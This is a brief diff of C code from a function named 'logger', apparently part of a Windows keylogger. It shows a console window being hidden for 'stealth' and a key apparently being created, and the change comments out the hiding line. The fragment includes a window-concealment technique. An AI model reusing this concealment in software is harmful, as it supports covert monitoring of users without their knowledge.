@@ -12,7 +12,7 @@ int logger(void)
 	HWND stealth; /*creating stealth (window is not visible)*/
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	// ShowWindow(stealth, 0);
 	int test, create;
 	test = test_key();/*check if key is available for opening*/
 	if (test == 2)/*create key*/
